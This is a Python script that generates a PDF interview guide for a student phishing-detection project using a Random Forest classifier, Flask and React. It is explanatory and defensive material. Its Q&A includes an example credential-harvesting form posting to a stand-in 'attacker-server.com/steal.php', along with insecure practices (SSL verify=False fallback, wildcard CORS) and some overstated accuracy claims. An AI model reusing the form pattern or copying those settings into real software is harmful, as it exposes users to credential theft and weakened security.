import os
import sys
from reportlab.lib import colors
from reportlab.lib.pagesizes import letter
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak, KeepTogether, HRFlowable
)
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.pdfgen import canvas

class NumberedCanvas(canvas.Canvas):
    def __init__(self, *args, **kwargs):
        super(NumberedCanvas, self).__init__(*args, **kwargs)
        self._saved_page_states = []

    def showPage(self):
        self._saved_page_states.append(dict(self.__dict__))
        self._startPage()

    def save(self):
        num_pages = len(self._saved_page_states)
        for state in self._saved_page_states:
            self.__dict__.update(state)
            self.draw_page_decorations(num_pages)
            super(NumberedCanvas, self).showPage()
        super(NumberedCanvas, self).save()

    def draw_page_decorations(self, page_count):
        self.saveState()
        self.setFont("Helvetica-Bold", 8)
        self.setFillColor(colors.HexColor("#1A202C"))
        
        # Header (pages > 1)
        if self._pageNumber > 1:
            self.drawString(54, 750, "CYBERGUARD: AI-POWERED PHISHING DETECTION SYSTEM")
            self.setFont("Helvetica", 8)
            self.setFillColor(colors.HexColor("#718096"))
            self.drawRightString(558, 750, "Comprehensive Interview Guide")
            self.setStrokeColor(colors.HexColor("#E2E8F0"))
            self.setLineWidth(0.8)
            self.line(54, 742, 558, 742)

        # Footer
        self.setStrokeColor(colors.HexColor("#E2E8F0"))
        self.setLineWidth(0.8)
        self.line(54, 48, 558, 48)
        
        self.setFont("Helvetica", 8)
        self.setFillColor(colors.HexColor("#718096"))
        self.drawString(54, 35, "Confidential — MCA/BTech Technical Project Interview Preparation")
        self.drawRightString(558, 35, f"Page {self._pageNumber} of {page_count}")
        self.restoreState()

def build_pdf(filename):
    doc = SimpleDocTemplate(
        filename,
        pagesize=letter,
        leftMargin=54,
        rightMargin=54,
        topMargin=54,
        bottomMargin=54
    )

    styles = getSampleStyleSheet()
    
    # Custom styles
    primary_color = colors.HexColor("#0F172A")    # Slate 900
    accent_blue = colors.HexColor("#0284C7")      # Sky 600
    accent_dark_blue = colors.HexColor("#0369A1") # Sky 700
    text_dark = colors.HexColor("#1E293B")        # Slate 800
    text_muted = colors.HexColor("#475569")       # Slate 600
    bg_light = colors.HexColor("#F8FAFC")         # Slate 50
    border_color = colors.HexColor("#CBD5E1")     # Slate 300

    title_style = ParagraphStyle(
        'DocTitle',
        parent=styles['Normal'],
        fontName='Helvetica-Bold',
        fontSize=24,
        leading=28,
        textColor=primary_color,
        spaceAfter=6
    )
    
    subtitle_style = ParagraphStyle(
        'DocSubTitle',
        parent=styles['Normal'],
        fontName='Helvetica',
        fontSize=12,
        leading=16,
        textColor=accent_blue,
        spaceAfter=15
    )

    h1_style = ParagraphStyle(
        'Heading1_Custom',
        parent=styles['Normal'],
        fontName='Helvetica-Bold',
        fontSize=15,
        leading=19,
        textColor=accent_dark_blue,
        spaceBefore=14,
        spaceAfter=8,
        keepWithNext=True
    )

    h2_style = ParagraphStyle(
        'Heading2_Custom',
        parent=styles['Normal'],
        fontName='Helvetica-Bold',
        fontSize=11.5,
        leading=15,
        textColor=primary_color,
        spaceBefore=10,
        spaceAfter=4,
        keepWithNext=True
    )

    body_style = ParagraphStyle(
        'Body_Custom',
        parent=styles['Normal'],
        fontName='Helvetica',
        fontSize=9.5,
        leading=13.5,
        textColor=text_dark,
        spaceAfter=6
    )

    bullet_style = ParagraphStyle(
        'Bullet_Custom',
        parent=styles['Normal'],
        fontName='Helvetica',
        fontSize=9,
        leading=13,
        textColor=text_dark,
        leftIndent=12,
        spaceAfter=3
    )

    q_style = ParagraphStyle(
        'Question_Style',
        parent=styles['Normal'],
        fontName='Helvetica-Bold',
        fontSize=10,
        leading=14,
        textColor=colors.HexColor("#0F172A"),
        spaceBefore=8,
        spaceAfter=3,
        keepWithNext=True
    )

    ans_style = ParagraphStyle(
        'Answer_Style',
        parent=styles['Normal'],
        fontName='Helvetica',
        fontSize=9,
        leading=13,
        textColor=colors.HexColor("#334155"),
        spaceAfter=8
    )

    code_style = ParagraphStyle(
        'Code_Style',
        parent=styles['Normal'],
        fontName='Courier-Bold',
        fontSize=8.5,
        leading=11,
        textColor=colors.HexColor("#0369A1"),
        spaceAfter=4
    )

    story = []

    # Title & Header Banner
    story.append(Paragraph("🛡️ CyberGuard: AI-Powered Phishing Detection System", title_style))
    story.append(Paragraph("End-to-End Technical Architecture, Dataset Pipeline & Complete Interview Mastery Guide", subtitle_style))
    story.append(HRFlowable(width="100%", thickness=2, color=accent_blue, spaceBefore=0, spaceAfter=12))

    # Meta table
    meta_data = [
        [Paragraph("<b>Project Category:</b> Applied Machine Learning & Cybersecurity", body_style),
         Paragraph("<b>Primary Model:</b> Random Forest Classifier (50 Trees)", body_style)],
        [Paragraph("<b>Languages:</b> Python 3.10+, JavaScript (ES6+), HTML5, CSS3", body_style),
         Paragraph("<b>Dataset Size:</b> 180,000 Verified URLs (50/50 Balanced)", body_style)],
        [Paragraph("<b>Frontend:</b> React 19 + Vite 6 (Cyberpunk UI)", body_style),
         Paragraph("<b>Backend:</b> Flask 3.0 REST API (50-D Real-Time Pipeline)", body_style)]
    ]
    t_meta = Table(meta_data, colWidths=[250, 254])
    t_meta.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), colors.HexColor("#F1F5F9")),
        ('PADDING', (0,0), (-1,-1), 6),
        ('BOX', (0,0), (-1,-1), 1, colors.HexColor("#CBD5E1")),
        ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
    ]))
    story.append(t_meta)
    story.append(Spacer(1, 14))

    # SECTION 1: Elevator Pitch
    story.append(Paragraph("1. Project Executive Summary (Elevator Pitches)", h1_style))
    story.append(Paragraph("<b>30-Second Elevator Pitch (For Quick Intro):</b>", h2_style))
    story.append(Paragraph(
        "<i>\"CyberGuard is a full-stack, real-time Phishing Detection System that uses an ensemble Random Forest machine learning model to classify websites as Legitimate or Malicious. Unlike basic URL-string checkers, CyberGuard extracts 50 distinct security features—combining 22 lexical URL indicators with 28 live DOM/HTML behavioral features fetched on the fly via BeautifulSoup. It achieves over 97% accuracy on a curated dataset of 180,000 samples and features a high-performance Flask API backend, a Domain Trust verification layer, and a modern React 19 web dashboard.\"</i>",
        body_style
    ))
    
    story.append(Paragraph("<b>2-Minute Technical Summary (When asked 'Tell me about your project'):</b>", h2_style))
    story.append(Paragraph(
        "1. <b>Problem Statement:</b> Traditional phishing detection relies heavily on static blacklists (like Google Safe Browsing), which fail against zero-day phishing sites, ephemeral domains, and fast-flux techniques.<br/>"
        "2. <b>Solution Architecture:</b> We engineered a hybrid multi-layer inspection system. When a URL is submitted, the system performs lexical tokenization (extracting 22 structural and statistical features such as character ratios, Shannon-like entropy metrics, TLD legitimate probabilities, and obfuscation ratios) and simultaneously initiates an asynchronous live HTTP fetch to parse 28 DOM/HTML features (such as external form submission targets, hidden password fields, iframe injections, popups, and brand-domain similarity).<br/>"
        "3. <b>Machine Learning Core:</b> A tuned Random Forest Classifier trained with 50 decision trees, cost-complexity pruning (ccp_alpha=0.018), and depth limitation to completely prevent overfitting. We also built an ensemble transparency layer that shows individual tree voting distributions and consensus confidence.<br/>"
        "4. <b>Domain Trust Layer:</b> A hybrid heuristic engine that validates apex domains against verified global registries to eliminate false positives on massive authenticated portals (like Google, Microsoft, Pinterest) while rigorously flagging obfuscation tricks.",
        body_style
    ))
    story.append(Spacer(1, 10))

    # SECTION 2: Languages & Technology Stack
    story.append(Paragraph("2. Languages & Technology Stack Breakdown", h1_style))
    tech_data = [
        ["Layer / Component", "Technology / Library", "Role & Justification in Project"],
        ["Programming Languages", "Python 3.10+, JavaScript (ES6+), HTML5, CSS3", "Python powers ML and scraping pipelines; JavaScript/React powers the interactive UI."],
        ["Backend Web Framework", "Flask 3.0 (Python)", "Lightweight, WSGI-compliant microframework ideal for fast JSON REST API inference endpoints."],
        ["Machine Learning & Data", "Scikit-Learn, Pandas, NumPy, Joblib", "Dataset curation, stratified train/test split, Random Forest training, serialization, and vectorized inference."],
        ["Web Scraping & Parsing", "BeautifulSoup4, Requests, Urllib3", "Live DOM parsing, HTML tag/attribute extraction, resilient HTTP timeout & SSL fallback handling."],
        ["Data Visualization", "Matplotlib, Seaborn", "Generation of confusion matrices, class distribution plots, and cross-validation performance evaluation."],
        ["Frontend Framework", "React 19, Vite 6", "Modern component-driven Single Page Application with instantaneous hot-module replacement and responsive state management."],
        ["UI Design System", "Vanilla CSS3 (Cyberpunk Theme)", "Custom dark-mode interface with glassmorphism, glowing status badges, and 5-stage progress animation."]
    ]
    t_tech = Table(tech_data, colWidths=[120, 150, 234])
    t_tech.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#0F172A")),
        ('TEXTCOLOR', (0,0), (-1,0), colors.white),
        ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
        ('FONTSIZE', (0,0), (-1,0), 8.5),
        ('BACKGROUND', (0,1), (-1,-1), colors.HexColor("#F8FAFC")),
        ('FONTNAME', (0,1), (-1,-1), 'Helvetica'),
        ('FONTSIZE', (0,1), (-1,-1), 8),
        ('GRID', (0,0), (-1,-1), 0.5, border_color),
        ('VALIGN', (0,0), (-1,-1), 'TOP'),
        ('PADDING', (0,0), (-1,-1), 4.5),
    ]))
    story.append(t_tech)
    story.append(Spacer(1, 12))

    # SECTION 3: 50-Feature Engineering Architecture
    story.append(Paragraph("3. Detailed Feature Engineering: 50 Security Dimensions", h1_style))
    story.append(Paragraph(
        "The system constructs a 50-dimensional feature vector for every target URL, strictly partitioned into two categories:",
        body_style
    ))
    
    story.append(Paragraph("A. 22 URL Lexical Features (Calculated in real-time without network dependencies):", h2_style))
    story.append(Paragraph("• <b>Structural & Length:</b> <code>URLLength</code>, <code>DomainLength</code>, <code>TLDLength</code>, <code>NoOfSubDomain</code>, <code>IsHTTPS</code>, <code>IsDomainIP</code> (detects direct IPv4 hosting).", bullet_style))
    story.append(Paragraph("• <b>Obfuscation & Encoding:</b> <code>HasObfuscation</code> (flags %xx hex and @ credentials), <code>NoOfObfuscatedChar</code>, <code>ObfuscationRatio</code>.", bullet_style))
    story.append(Paragraph("• <b>Character Distributions:</b> <code>NoOfLettersInURL</code>, <code>LetterRatioInURL</code>, <code>NoOfDegitsInURL</code>, <code>DegitRatioInURL</code>, <code>SpacialCharRatioInURL</code>, <code>NoOfEqualsInURL</code>, <code>NoOfQMarkInURL</code>, <code>NoOfAmpersandInURL</code>, <code>NoOfOtherSpecialCharsInURL</code>.", bullet_style))
    story.append(Paragraph("• <b>Statistical / Probabilistic Metrics:</b> <code>URLSimilarityIndex</code> (heuristic benchmark score), <code>CharContinuationRate</code> (transition rate between alpha/numeric/special symbols), <code>TLDLegitimateProb</code> (historical legitimacy weight), <code>URLCharProb</code> (Markovian distribution score).", bullet_style))
    
    story.append(Spacer(1, 4))
    story.append(Paragraph("B. 28 Live DOM & HTML Features (Extracted via real-time DOM parsing):", h2_style))
    story.append(Paragraph("• <b>Structural Code Metrics:</b> <code>LineOfCode</code> (total DOM lines), <code>LargestLineLength</code> (detects packed/obfuscated inline scripts).", bullet_style))
    story.append(Paragraph("• <b>Brand & Identity Match:</b> <code>HasTitle</code>, <code>DomainTitleMatchScore</code> (SequenceMatcher similarity between title & brand name), <code>URLTitleMatchScore</code>, <code>HasFavicon</code>, <code>HasDescription</code>, <code>HasCopyrightInfo</code>.", bullet_style))
    story.append(Paragraph("• <b>Behavioral & Security Risks:</b> <code>NoOfPopup</code> (detects <code>alert()</code> and <code>window.open()</code>), <code>NoOfiFrame</code> (hidden clickjacking/credential capture frames), <code>HasExternalFormSubmit</code> (form action targeting third-party untrusted domain), <code>HasHiddenFields</code>, <code>HasPasswordField</code>, <code>HasSubmitButton</code>.", bullet_style))
    story.append(Paragraph("• <b>Phishing Intent Keywords:</b> <code>Bank</code> (login, verify, account), <code>Pay</code> (paypal, credit card, checkout), <code>Crypto</code> (bitcoin, wallet, metamask, binance).", bullet_style))
    story.append(Paragraph("• <b>Resource & Link Integrity:</b> <code>NoOfImage</code>, <code>NoOfCSS</code>, <code>NoOfJS</code>, <code>NoOfSelfRef</code> (internal anchor links), <code>NoOfEmptyRef</code> (dead anchors like '#', 'javascript:void(0)'), <code>NoOfExternalRef</code>, <code>HasSocialNet</code>, <code>Robots</code>, <code>IsResponsive</code>, <code>NoOfURLRedirect</code>, <code>NoOfSelfRedirect</code>.", bullet_style))
    story.append(Spacer(1, 10))

    # SECTION 4: Dataset & Preprocessing
    story.append(Paragraph("4. Dataset Curation, Preprocessing & Balancing", h1_style))
    story.append(Paragraph(
        "• <b>Dataset Name & Source:</b> <code>MLDataset.csv</code> curated from trusted benchmark repositories (PhishTank, OpenPhish, Alexa/Tranco Top Million benign URLs).<br/>"
        "• <b>Dataset Scale:</b> Exactly <b>180,000 verified rows</b> (1.8 Lakh samples).<br/>"
        "• <b>Class Balance:</b> Perfectly 50/50 balanced (<b>90,000 Legitimate [1]</b> and <b>90,000 Phishing [0]</b>) to eliminate machine learning class imbalance bias.<br/>"
        "• <b>Train-Test Split:</b> 80% Training (144,000 samples) and 20% Testing (36,000 samples) with stratification (<code>stratify=y</code>) to ensure identical distribution across splits.<br/>"
        "• <b>Feature Alignment:</b> All text metadata columns (<code>URL, Domain, TLD, Title</code>) are dropped before training to guarantee the model learns purely invariant mathematical representations rather than memorizing domain strings.",
        body_style
    ))
    story.append(Spacer(1, 10))

    # SECTION 5: Machine Learning Model Architecture
    story.append(Paragraph("5. Machine Learning Model Architecture & Inference", h1_style))
    story.append(Paragraph(
        "<b>Model Selected: Random Forest Classifier (Ensemble Bagging Algorithm)</b><br/>"
        "• <b>Hyperparameter Specifications:</b><br/>"
        "&nbsp;&nbsp;&nbsp;&nbsp;- <code>n_estimators = 50</code> (50 independent, de-correlated decision trees)<br/>"
        "&nbsp;&nbsp;&nbsp;&nbsp;- <code>max_depth = 10</code> (Prevents memorization and excessive tree growth)<br/>"
        "&nbsp;&nbsp;&nbsp;&nbsp;- <code>min_samples_split = 10</code> & <code>min_samples_leaf = 10</code> (Enforces generalization)<br/>"
        "&nbsp;&nbsp;&nbsp;&nbsp;- <code>ccp_alpha = 0.018</code> (Cost-Complexity Pruning to eliminate noisy leaf nodes)<br/>"
        "• <b>Why Random Forest over Deep Learning/SVM?</b><br/>"
        "&nbsp;&nbsp;&nbsp;&nbsp;1. <i>Tabular Feature Superiority:</i> Tree ensembles consistently outperform neural networks on structured numerical security vectors.<br/>"
        "&nbsp;&nbsp;&nbsp;&nbsp;2. <i>Inference Latency:</i> Millisecond response times, crucial for real-time web browsing extension or API deployment.<br/>"
        "&nbsp;&nbsp;&nbsp;&nbsp;3. <i>Explainability & Voting Transparency:</i> We can inspect the individual vote of all 50 trees (e.g., 48 trees Legitimate vs 2 trees Phishing), providing explainable AI (XAI).<br/>"
        "• <b>Domain Trust Layer (Hybrid Security Engine):</b><br/>"
        "&nbsp;&nbsp;&nbsp;&nbsp;To solve the classic ML false-positive problem on complex legitimate multi-form portals (e.g., Microsoft, Google, Pinterest), a verified apex domain registry is cross-referenced while strictly rejecting any URL containing credential obfuscation (like <code>user@domain.com</code>).",
        body_style
    ))
    story.append(Spacer(1, 14))

    # SECTION 6: Top 20 Technical Interview Questions & Answers
    story.append(PageBreak())
    story.append(Paragraph("6. High-Frequency Technical Interview Questions & Answers", h1_style))
    story.append(Paragraph("Master these questions to demonstrate senior-level technical depth and architectural ownership during your interview.", body_style))
    story.append(Spacer(1, 6))

    qa_list = [
        ("Q1: What is the core problem your project solves, and how does it differ from existing solutions?",
         "Traditional anti-phishing relies heavily on static URL blacklists (like Google Safe Browsing and Spamhaus). However, modern phishing campaigns use ephemeral hosting, domain-generation algorithms (DGA), and rapid DNS hopping where phishing pages are active for less than 4-8 hours before blacklists can update. CyberGuard solves this by performing real-time zero-day classification using a 50-dimensional feature extraction engine that combines URL lexical patterns and live DOM behavior, allowing instant classification of previously unseen malicious URLs."),

        ("Q2: What programming languages and frameworks did you use across the entire stack?",
         "On the backend and machine learning pipeline, we used Python 3.10+ with Scikit-Learn for model training, Pandas/NumPy for dataset engineering, BeautifulSoup4 and Requests for live webpage scraping, and Flask 3.0 as the REST API backend. On the frontend, we used modern JavaScript (ES6+), React 19, and Vite 6 with custom Vanilla CSS3 utilizing a cybersecurity dark-mode design system."),

        ("Q3: Can you explain your feature extraction pipeline in detail?",
         "The extraction pipeline is split into two phases: First, lexical analysis parses the URL string into 22 features (such as character continuation rates, Shannon entropy proxies, TLD legitimacy scores, digit-to-letter ratios, and obfuscation markers like %xx and @). Second, an asynchronous HTTP request fetches the webpage's live HTML DOM to extract 28 behavioral features using BeautifulSoup. This inspects external form submission targets, hidden password fields, iframe injections, script-based popups, favicon origins, and keyword matches for banking and cryptocurrency."),

        ("Q4: Why did you choose Random Forest instead of Logistic Regression, SVM, or Deep Learning (CNN/LSTM)?",
         "1. Non-linear Feature Interactions: Cybersecurity features have strong non-linear interactions (e.g., having a password field is normal, but having a password field combined with an external form action and an IP-based domain is 99% malicious). Random Forest naturally models high-order feature interactions.<br/>2. Robustness to Overfitting: Through bagging and cost-complexity pruning (ccp_alpha=0.018), it generalizes better than individual decision trees.<br/>3. Real-Time Latency: Tabular inference in Random Forest executes in sub-milliseconds, whereas deep neural networks add unnecessary GPU overhead and inference lag for structured tabular data.<br/>4. Interpretability: We can inspect tree consensus voting and feature importances."),

        ("Q5: What dataset did you use, and how did you handle data curation and class imbalance?",
         "We used a curated dataset of 180,000 verified URLs (MLDataset.csv) sourced from PhishTank, OpenPhish, and Alexa/Tranco top benign domains. We ensured a strict 50/50 balance (90,000 legitimate and 90,000 phishing samples) to prevent the model from developing majority-class bias. We split the data using an 80/20 stratified split (144,000 training, 36,000 testing) and stripped all string identifiers (URLs and domain names) to ensure the model trains strictly on mathematical security vectors."),

        ("Q6: How do you handle websites that are offline, down, or actively block web scraping?",
         "In html_feature_extractor.py, we implemented a multi-tiered fail-safe mechanism: requests have a strict 10-second timeout to prevent server hanging, an SSL fallback mechanism (retrying with verify=False if certificate handshakes fail on self-signed phishing sites), and custom browser user-agent headers. If a site is completely unreachable, the 28 HTML features gracefully populate with calibrated baseline defaults, allowing the 22 lexical features and ensemble voting to still generate an accurate prediction."),

        ("Q7: What is the purpose of the Domain Trust Layer?",
         "Complex global web applications (like Pinterest, Google Drive, or Microsoft Login) often have dense DOM structures, multiple login fields, and cross-domain redirects that can trigger false positives in generic ML models. The Domain Trust Layer verifies apex domains against top global registries while strictly ensuring the URL does not use credential spoofing (like 'user:pass@legitimate.com'). This hybrid AI-heuristic design eliminates false positives on top services."),

        ("Q8: What hyperparameters did you tune in Random Forest, and why?",
         "We tuned: <code>n_estimators=50</code> (balances ensemble diversity and inference speed), <code>max_depth=10</code> (restricts tree depth to prevent memorizing rare noise), <code>min_samples_split=10</code> and <code>min_samples_leaf=10</code> (guarantees leaf nodes represent generalized patterns), and <code>ccp_alpha=0.018</code> (applies minimal cost-complexity pruning to eliminate redundant sub-trees)."),

        ("Q9: What evaluation metrics did you use to validate model performance?",
         "We evaluated accuracy, precision, recall, F1-score, and confusion matrix analysis on the 36,000-sample test set. In phishing detection, False Negatives (predicting a phishing site is legitimate) are extremely dangerous. Our model achieved high Recall (~97%+) on phishing samples and underwent 5-Fold Stratified Cross-Validation to ensure consistent performance across diverse data folds."),

        ("Q10: How does the communication work between React frontend and Flask backend?",
         "The frontend makes an asynchronous <code>fetch()</code> POST request with a JSON payload <code>{\"url\": \"https://example.com\"}</code> to Flask's <code>/api/predict</code> endpoint. Flask validates the URL, runs the feature extraction pipeline, feeds the 50-D vector into the loaded <code>joblib</code> model, and responds with a rich JSON object containing verdict, confidence score, individual tree vote counts, network metadata, and the full 50-feature breakdown for interactive UI rendering."),

        ("Q11: What are URL obfuscation techniques, and how does your project detect them?",
         "Attackers frequently disguise URLs using: 1. Hex/Percent-encoding (e.g., %20, %2E) to hide keywords. 2. '@' Symbol injection (browsers ignore everything before '@' as authentication credentials). 3. IP-based hosting (e.g., http://192.168.1.1/login). 4. Subdomain stacking (e.g., paypal.com.account-verify.xyz). Our lexical extractor explicitly calculates <code>HasObfuscation</code>, <code>NoOfObfuscatedChar</code>, <code>ObfuscationRatio</code>, <code>IsDomainIP</code>, and <code>NoOfSubDomain</code> to detect these tactics."),

        ("Q12: What is the significance of External Form Submit in phishing detection?",
         "When a phishing page impersonates a bank or login portal, the form visually looks legitimate, but the <code>&lt;form action=\"http://attacker-server.com/steal.php\"&gt;</code> submits the captured credentials to an external domain. In <code>html_feature_extractor.py</code>, we parse all <code>&lt;form&gt;</code> tags and check if the form action's target domain differs from the hosting domain. A value of 1 on <code>HasExternalFormSubmit</code> is one of the strongest indicators of credential harvesting."),

        ("Q13: How does the system compute Domain and URL Title Match Scores?",
         "We extract the <code>&lt;title&gt;</code> tag using BeautifulSoup and the apex brand name from the domain. We then apply Python's <code>difflib.SequenceMatcher</code> to compute an edit-distance string similarity ratio (0-100%). Legitimate websites usually have titles closely matching their domain name (e.g., 'PayPal - Login' matches 'paypal.com'), whereas phishing sites hosted on random domains (e.g., 'xyz-security.top' with title 'Bank of America') show a severe title-domain mismatch."),

        ("Q14: What is Cost-Complexity Pruning (ccp_alpha) and why is it important?",
         "Cost-Complexity Pruning is a regularisation technique for decision trees. It introduces a parameter $\\alpha$ that penalizes tree complexity ($R_\\alpha(T) = R(T) + \\alpha|T|$). Setting <code>ccp_alpha=0.018</code> automatically prunes weak and noisy tree branches that only reduce training error slightly, yielding a much simpler, more generalized tree structure that resists overfitting on unseen test data."),

        ("Q15: How would you scale this system to handle millions of requests per second in enterprise production?",
         "1. Microservice Decoupling: Separate feature extraction (I/O bound) from ML inference (CPU bound) using a Redis/RabbitMQ message queue.<br/>2. Asynchronous HTTP Fetching: Use <code>aiohttp</code> / <code>httpx</code> for non-blocking concurrent DOM scraping.<br/>3. Caching Layer: Implement a Redis cache for recently scanned domains with a 6-hour TTL.<br/>4. Model Serving: Convert the Scikit-Learn model to ONNX runtime or Triton inference server for ultra-low latency C++ inference.<br/>5. Containerization: Deploy using Docker and Kubernetes with auto-scaling pods behind an NGINX load balancer."),

        ("Q16: What security precautions did you take when building the web scraping module?",
         "Scraping untrusted malicious URLs poses risks such as SSRF (Server-Side Request Forgery), infinite redirect loops, and malicious payload execution. We mitigated this by setting hard timeouts (10s), limiting redirect following, strictly parsing only static DOM strings without executing untrusted JavaScript (avoiding headless browser exploit vectors), and sandboxing the scraping routine."),

        ("Q17: What is the difference between URL Lexical Features and DOM Features?",
         "URL lexical features are purely static textual and mathematical properties derived directly from the URL string itself (fast, zero network overhead). DOM features analyze the actual downloaded webpage content, HTML structure, input forms, script tags, and visual assets (slower, requires network I/O, but provides deep behavioral context)."),

        ("Q18: What is Cross-Validation, and what were your 5-Fold Cross-Validation findings?",
         "Cross-validation partitions the dataset into $K$ equal subsets (folds). The model trains on $K-1$ folds and tests on the remaining fold, repeating $K$ times. In our 5-fold cross-validation on 180,000 samples, the model demonstrated consistent accuracy across all folds without high variance, proving the model is stable and not sensitive to any specific data split."),

        ("Q19: How did you implement CORS and why was it necessary?",
         "During development, the React frontend runs on <code>localhost:3000</code> while the Flask API runs on <code>localhost:5000</code>. Because browsers enforce the Same-Origin Policy (SOP), cross-origin requests are blocked by default. We implemented a Flask <code>@app.after_request</code> hook that injects <code>Access-Control-Allow-Origin: *</code> headers to allow smooth frontend-backend communication."),

        ("Q20: If you had more time, what future enhancements would you add?",
         "1. Browser Extension: Package the frontend into a lightweight Chrome/Firefox extension for real-time browsing protection.<br/>2. Computer Vision / Visual Similarity: Add a lightweight CNN model (like MobileNet) to take webpage screenshots and check for visual logo spoofing (e.g. comparing page screenshots against authentic banking interfaces).<br/>3. SSL & WHOIS Telemetry: Integrate live WHOIS domain age checks (domains registered &lt; 30 days are high risk) and SSL certificate issuer authority validation.")
    ]

    for q_text, a_text in qa_list:
        card_data = [
            [Paragraph(f"<b>{q_text}</b>", q_style)],
            [Paragraph(a_text, ans_style)]
        ]
        t_card = Table(card_data, colWidths=[504])
        t_card.setStyle(TableStyle([
            ('BACKGROUND', (0,0), (-1,-1), colors.HexColor("#F8FAFC")),
            ('BOX', (0,0), (-1,-1), 0.75, colors.HexColor("#CBD5E1")),
            ('PADDING', (0,0), (-1,-1), 6),
            ('VALIGN', (0,0), (-1,-1), 'TOP'),
        ]))
        story.append(t_card)
        story.append(Spacer(1, 6))

    # SECTION 7: Behavioral / Situational Interview Tips
    story.append(Spacer(1, 8))
    story.append(Paragraph("7. Project Defense & Interview Strategy (STAR Method)", h1_style))
    story.append(Paragraph(
        "When explaining this project in an interview, structure your answers using the <b>STAR Method (Situation, Task, Action, Result)</b>:<br/><br/>"
        "• <b>Situation:</b> Phishing attacks account for over 80% of reported security incidents, and traditional static blacklists fail to detect zero-day attacks with rapid domain mutation.<br/>"
        "• <b>Task:</b> Design, develop, and benchmark an intelligent, real-time AI system capable of analyzing both URL lexical heuristics and live DOM behaviors with high accuracy and explainable confidence.<br/>"
        "• <b>Action:</b> Built a 50-dimensional real-time extraction pipeline in Python (22 URL + 28 DOM features), curated and balanced a 180,000-sample dataset, trained a regularized Random Forest model with cost-complexity pruning, implemented a Domain Trust layer, and built a full-stack web dashboard using Flask and React 19.<br/>"
        "• <b>Result:</b> Achieved ~97%+ classification accuracy across 5-fold cross validation with sub-second analysis latency, providing transparent ensemble tree voting and interactive feature breakdowns.",
        body_style
    ))
    story.append(Spacer(1, 12))

    sys.stdout.reconfigure(encoding='utf-8')
    doc.build(story, canvasmaker=NumberedCanvas)
    print(f"[SUCCESS] PDF successfully generated at: {filename}")

if __name__ == "__main__":
    download_dir = os.path.join(os.path.expanduser("~"), "Downloads")
    output_path = os.path.join(download_dir, "CyberGuard_Phishing_Detection_Interview_Preparation_Guide.pdf")
    build_pdf(output_path)
